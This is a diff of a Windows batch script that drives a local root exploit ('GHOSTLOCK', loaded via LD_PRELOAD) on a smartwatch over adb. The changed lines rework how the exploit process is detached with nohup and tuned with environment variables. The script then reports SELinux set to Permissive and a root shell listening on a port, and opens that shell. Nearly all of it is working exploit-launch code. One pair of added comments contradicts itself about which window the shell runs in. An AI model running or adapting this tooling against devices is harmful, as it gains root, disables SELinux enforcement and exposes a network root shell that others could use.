@@ -83,12 +83,15 @@ rem as its octal escape and $GFSO stays literal until the fire reads it.
 "%ADB%" shell "printf '#\041/system/bin/sh\nexport LD_PRELOAD=$GFSO\nexec /system/bin/toybox true\n' > %DT%/fire3.sh; chmod 755 %DT%/fire3.sh" >nul 2>&1
 "%ADB%" shell "rm -f %DT%/log_*.txt" >nul 2>&1
 
-rem Detach ON THE DEVICE: if this window closes the fire must still live, because
-rem tearing the fire's process group down is what panics the watch.
-rem `<nul` is NOT cosmetic: `start /b` shares THIS console, and an adb.exe that is
-rem still attached to stdin steals the user's keystrokes -- that is why the
-rem interactive shell looked hung after `id` (the line never reached rootsh.py).
-start /b "" "%ADB%" shell "GFSO=%DT%/!GSN! GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=44 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAY=1 sh %DT%/fire3.sh" <nul >nul 2>&1
+rem Detach ON THE DEVICE instead of on the host: `nohup sh -c '...' </dev/null &`
+rem orphans the fire into init and this adb call returns at once, so NO host
+rem process is left attached to this console. A `start /b adb shell` sibling keeps
+rem reading the keyboard and silently swallows whatever the user types -- that is
+rem what made the interactive shell look hung right after `id`. nohup also covers
+rem the seconds before the exploit installs its own SIGHUP ignore, and
+rem GHOSTLOCK_STAY=1 keeps the process alive afterwards (never kill it: tearing
+rem down the fire's process group is what panics the watch).
+"%ADB%" shell "nohup sh -c 'GFSO=%DT%/!GSN! GHOSTLOCK_WS_TARGET=st GHOSTLOCK_STAT_UWALK=1 GHOSTLOCK_ATTEMPTS=44 GHOSTLOCK_WBASE=4 GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_STAY=1 sh %DT%/fire3.sh' </dev/null >/dev/null 2>&1 &" >nul 2>&1
 
 set /a W=0
 :waitroot
@@ -229,7 +232,13 @@ echo [ok] ROOT - SELinux is Permissive and a root shell listens on port %PORT%
 echo [ok] any time later, without re-firing:  %PY% rootsh.py "id"
 echo.
 echo %ARGS%|"%FIND%" "--cmd" >nul && goto runcmds
-echo --- root shell (exit leaves the watch rooted until it reboots) ------------
+rem The shell gets its OWN console window. In this window the fire's `adb shell`
+rem client is still alive (it is what keeps the exploit process group up), and
+rem two processes reading the same console keyboard means your typed command can
+rem be swallowed by adb.exe instead of reaching the shell -- which is exactly how
+rem "I typed id and nothing happened" looked.
+echo --- root shell in THIS window (exit leaves the watch rooted until reboot) --
+rem Safe to run inline now that no `start /b` adb client shares this keyboard.
 %PY% rootsh.py
 goto end
 :runcmds
